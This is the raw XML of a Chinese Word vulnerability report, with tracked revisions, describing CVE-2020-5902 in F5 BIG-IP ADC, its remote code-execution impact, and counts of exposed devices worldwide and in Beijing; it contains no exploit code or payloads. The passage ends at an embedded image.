              <w:delText>8</w:delText>
            </w:r>
          </w:del>
          <w:del w:id="82" w:author="芮志清" w:date="2020-07-10T12:11:00Z"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372D5AE6" w14:textId="6826E9F7" w:rsidR="00B92280" w:rsidDel="002F059C" w:rsidRDefault="00B92280">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="420"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:rPr>
              <w:del w:id="83" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="84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"_Toc45272953"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85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86" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>4.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</w:rPr>
              <w:delText>总结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_Toc45272953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</w:del>
          <w:del w:id="87" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
            <w:r w:rsidDel="00E24169">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>8</w:delText>
            </w:r>
          </w:del>
          <w:del w:id="88" w:author="芮志清" w:date="2020-07-10T12:11:00Z"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6204F0CF" w14:textId="3B43C557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89" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="90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"_Toc45272954"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91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92" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>4.1.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  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:delText>评价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_Toc45272954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</w:del>
          <w:del w:id="93" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
            <w:r w:rsidDel="00E24169">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>8</w:delText>
            </w:r>
          </w:del>
          <w:del w:id="94" w:author="芮志清" w:date="2020-07-10T12:11:00Z"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72972B6F" w14:textId="5617B402" w:rsidR="00B92280" w:rsidDel="002F059C" w:rsidRDefault="00B92280">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1050"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9016"/>
            </w:tabs>
            <w:ind w:left="480"/>
            <w:rPr>
              <w:del w:id="95" w:author="芮志清" w:date="2020-07-10T12:11:00Z"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:del w:id="96" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/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Del="002F059C">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:delInstrText>HYPERLINK \l "_Toc45272955"</w:delInstrText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delInstrText xml:space="preserve"> </w:delInstrText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
          </w:del>
          <w:ins w:id="97" w:author="芮志清" w:date="2020-07-10T12:12:00Z">
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:hint="eastAsia"/>
                <w:b/>
                <w:bCs/>
                <w:noProof/>
              </w:rPr>
              <w:t>错误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!</w:t>
            </w:r>
            <w:r w:rsidR="00CF72CA">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:hint="eastAsia"/>
                <w:b/>
                <w:bCs/>
                <w:noProof/>
              </w:rPr>
              <w:t>超链接引用无效。</w:t>
            </w:r>
          </w:ins>
          <w:del w:id="98" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:delText>4.2.</w:delText>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:sz w:val="21"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:delText>附件：北京市拥有相似漏洞的网站</w:delText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:delText>IP</w:delText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:delText>列表（来自</w:delText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:delText>FOFA</w:delText>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:delText>）</w:delText>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delInstrText xml:space="preserve"> PAGEREF _Toc45272955 \h </w:delInstrText>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
          </w:del>
          <w:del w:id="99" w:author="芮志清" w:date="2020-07-10T12:05:00Z">
            <w:r w:rsidDel="00E24169">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:delText>8</w:delText>
            </w:r>
          </w:del>
          <w:del w:id="100" w:author="芮志清" w:date="2020-07-10T12:11:00Z">
            <w:r w:rsidDel="002F059C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
            <w:r w:rsidRPr="001E5186" w:rsidDel="002F059C">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:noProof/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:del>
        </w:p>
        <w:p w14:paraId="21397C90" w14:textId="2C6A334B" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:lang w:val="zh-CN"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="356C5A62" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="69050515" w14:textId="1AEF50DD" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:ins w:id="101" w:author="芮志清" w:date="2020-07-10T12:07:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="102" w:name="_Toc45275578"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>问题概述</w:t>
      </w:r>
      <w:bookmarkEnd w:id="102"/>
    </w:p>
    <w:p w14:paraId="69FDDDB5" w14:textId="32882AF8" w:rsidR="00E24169" w:rsidRPr="00E24169" w:rsidDel="00E24169" w:rsidRDefault="00E24169">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="103" w:author="芮志清" w:date="2020-07-10T12:07:00Z"/>
          <w:rPrChange w:id="104" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
            <w:rPr>
              <w:del w:id="105" w:author="芮志清" w:date="2020-07-10T12:07:00Z"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="106" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
          <w:pPr>
            <w:pStyle w:val="1"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:bookmarkStart w:id="107" w:name="_Toc45275507"/>
      <w:bookmarkStart w:id="108" w:name="_Toc45275543"/>
      <w:bookmarkStart w:id="109" w:name="_Toc45275579"/>
      <w:bookmarkEnd w:id="107"/>
      <w:bookmarkEnd w:id="108"/>
      <w:bookmarkEnd w:id="109"/>
    </w:p>
    <w:p w14:paraId="00A0DEC9" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:bookmarkStart w:id="110" w:name="_Toc45275580"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>什么是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:t>IG-IP?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="110"/>
    </w:p>
    <w:p w14:paraId="368F6491" w14:textId="244DF4E2" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="111" w:author="芮志清" w:date="2020-07-10T12:07:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>BIG-IP ADC</w:t>
      </w:r>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>广泛应用于大型企业，数据中心、</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>云计算</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>平台中，可以实现应用加速、负载均衡、</w:t>
      </w:r>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SLL</w:t>
      </w:r>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>过载、</w:t>
      </w:r>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidRPr="00F3414D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>应用防火墙等功能。</w:t>
      </w:r>
      <w:ins w:id="112" w:author="芮志清" w:date="2020-07-10T12:09:00Z">
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>在全球发现</w:t>
        </w:r>
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="00E24169">
          <w:t>3049</w:t>
        </w:r>
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>个此类设备，其中北京市存在</w:t>
        </w:r>
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r w:rsidR="00E24169">
          <w:t>00</w:t>
        </w:r>
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>个此类设备。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6ED3405F" w14:textId="70556117" w:rsidR="00E24169" w:rsidRDefault="00E24169" w:rsidP="00E24169">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:ins w:id="113" w:author="芮志清" w:date="2020-07-10T12:07:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="114" w:name="_Toc45275581"/>
      <w:ins w:id="115" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>威胁程度</w:t>
        </w:r>
        <w:bookmarkEnd w:id="114"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="70E79B9C" w14:textId="075691E8" w:rsidR="00E24169" w:rsidRPr="00E24169" w:rsidDel="00E24169" w:rsidRDefault="00E24169">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="116" w:author="芮志清" w:date="2020-07-10T12:08:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="117" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
        <w:r w:rsidRPr="00E24169">
          <w:t>CVE-2020-5902</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>是</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="118" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>与</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:t>020</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>年</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>7</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>月</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>日爆出的关于</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="119" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>BIG-IP ADC</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="120" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>的高危漏洞。通过此漏洞，</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="121" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve"> Java </w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>代码执行</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>，</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>进而控制</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve"> F5 BIG-IP </w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>的全部功能</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="122" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>威胁</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="123" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>包括但不限于</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">: </w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>执行任意系统命令、开启</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>禁用服务、创建</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>删除服务器</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>端文件</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F3414D">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>等。该漏洞影响控制面板受影响，不影响数据面板。</w:t>
        </w:r>
        <w:r w:rsidRPr="009C46C3">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>该漏洞的漏洞等级为</w:t>
        </w:r>
        <w:r w:rsidRPr="00EC3455">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>极高</w:t>
        </w:r>
        <w:r w:rsidRPr="009C46C3">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>，且影响面为极广泛。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3611D436" w14:textId="5418B513" w:rsidR="00422B7D" w:rsidDel="00E24169" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="124" w:author="芮志清" w:date="2020-07-10T12:08:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="125" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="126" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>利用漏洞思路</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6506F022" w14:textId="25DAEF78" w:rsidR="00422B7D" w:rsidRPr="00980171" w:rsidDel="00E24169" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="127" w:author="芮志清" w:date="2020-07-10T12:08:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="128" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>未认证的攻击者可以通过发送伪造的恶意</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>HTTP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>请求到含有</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>TMUI</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>工具的具有漏洞的服务器来远程利用该漏洞。成功利用该漏洞可以完全控制设备的管理员权限，无需授权就可以在被黑的设备上执行任意命令。</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5637445B" w14:textId="3C258B1C" w:rsidR="00422B7D" w:rsidDel="00E24169" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="129" w:author="芮志清" w:date="2020-07-10T12:08:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="130" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="131" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>可能造成的影响</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="21464881" w14:textId="7A7B3C24" w:rsidR="00422B7D" w:rsidRPr="00F3414D" w:rsidDel="00E24169" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="132" w:author="芮志清" w:date="2020-07-10T12:07:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="133" w:author="芮志清" w:date="2020-07-10T12:07:00Z">
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve"> Java </w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>代码执行。进而控制</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve"> F5 BIG-IP </w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>的全部功能，包括但不限于</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText xml:space="preserve">: </w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>执行任意系统命令、开启</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>/</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>禁用服务、创建</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>/</w:delText>
        </w:r>
        <w:r w:rsidRPr="00F3414D" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</w:delText>
        </w:r>
        <w:r w:rsidRPr="009C46C3" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>所以该漏洞的漏洞等级为</w:delText>
        </w:r>
        <w:r w:rsidRPr="00B92280" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:b/>
            <w:bCs/>
            <w:rPrChange w:id="134" w:author="芮志清" w:date="2020-07-10T11:33:00Z">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>极高</w:delText>
        </w:r>
        <w:r w:rsidRPr="009C46C3" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，且影响面为极广泛。</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2058307E" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRPr="005F12D0" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:pPrChange w:id="135" w:author="芮志清" w:date="2020-07-10T12:08:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72490B04" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:bookmarkStart w:id="136" w:name="_Toc45275582"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>现状概述</w:t>
      </w:r>
      <w:bookmarkEnd w:id="136"/>
    </w:p>
    <w:p w14:paraId="6DB8C39B" w14:textId="77777777" w:rsidR="008C5718" w:rsidRDefault="00422B7D">
      <w:pPr>
        <w:keepNext/>
        <w:ind w:left="420"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="137" w:author="芮志清" w:date="2020-07-10T11:51:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="138" w:author="芮志清" w:date="2020-07-10T11:51:00Z">
          <w:pPr>
            <w:ind w:left="420"/>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:commentRangeStart w:id="139"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08548CCB" wp14:editId="2EA9F3E1">
